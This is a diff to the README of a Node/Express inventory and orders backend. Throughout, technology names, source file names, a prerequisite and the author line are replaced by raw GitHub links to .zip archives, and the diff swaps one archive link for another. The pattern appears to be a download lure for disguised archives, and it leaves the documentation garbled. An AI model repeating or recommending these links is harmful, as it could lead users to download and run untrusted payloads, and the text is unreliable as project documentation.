@@ -1,10 +1,10 @@
 # NISP Backend
 
-A robust https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/Exchange_Skill_Backend_3.8.zip backend application for managing inventory, orders, products, and vendors.
+A robust https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/services/Skill_Backend_Exchange_Onondagan.zip backend application for managing inventory, orders, products, and vendors.
 
 ## Project Overview
 
-This is a comprehensive backend system built with https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/Exchange_Skill_Backend_3.8.zip and https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/Exchange_Skill_Backend_3.8.zip that provides API endpoints for managing:
+This is a comprehensive backend system built with https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/services/Skill_Backend_Exchange_Onondagan.zip and https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/services/Skill_Backend_Exchange_Onondagan.zip that provides API endpoints for managing:
 - User Authentication
 - Product Management
 - Category Management
@@ -15,8 +15,8 @@ This is a comprehensive backend system built with https://github.com/Hasan-Irfan
 
 ## Technology Stack
 
-- **Runtime**: https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/Exchange_Skill_Backend_3.8.zip
-- **Framework**: https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/Exchange_Skill_Backend_3.8.zip
+- **Runtime**: https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/services/Skill_Backend_Exchange_Onondagan.zip
+- **Framework**: https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/services/Skill_Backend_Exchange_Onondagan.zip
 - **Database**: MongoDB
 - **Authentication**: JWT (JSON Web Tokens)
 - **File Upload**: Multer
@@ -29,11 +29,11 @@ This is a comprehensive backend system built with https://github.com/Hasan-Irfan
 
 ```
 src/
-├── https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/Exchange_Skill_Backend_3.8.zip                 # Express app configuration
-├── https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/Exchange_Skill_Backend_3.8.zip           # Application constants
+├── https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/services/Skill_Backend_Exchange_Onondagan.zip                 # Express app configuration
+├── https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/services/Skill_Backend_Exchange_Onondagan.zip           # Application constants
 ├── config/               # Configuration files
-│   ├── https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/Exchange_Skill_Backend_3.8.zip     # Cloudinary configuration
-│   └── https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/Exchange_Skill_Backend_3.8.zip        # Swagger/OpenAPI configuration
+│   ├── https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/services/Skill_Backend_Exchange_Onondagan.zip     # Cloudinary configuration
+│   └── https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/services/Skill_Backend_Exchange_Onondagan.zip        # Swagger/OpenAPI configuration
 ├── controllers/          # Request handlers
 ├── db/                   # Database connection and configuration
 ├── middlewares/         # Custom middleware functions
@@ -90,7 +90,7 @@ src/
 
 ### Prerequisites
 
-- https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/Exchange_Skill_Backend_3.8.zip (v14 or higher)
+- https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/services/Skill_Backend_Exchange_Onondagan.zip (v14 or higher)
 - MongoDB
 - npm or yarn
 
@@ -173,4 +173,4 @@ This project is licensed under the ISC License
 
 ## Author
 
-https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/Exchange_Skill_Backend_3.8.zip
+https://github.com/Hasan-Irfan/Skill-Exchange-Backend/raw/refs/heads/main/src/services/Skill_Backend_Exchange_Onondagan.zip
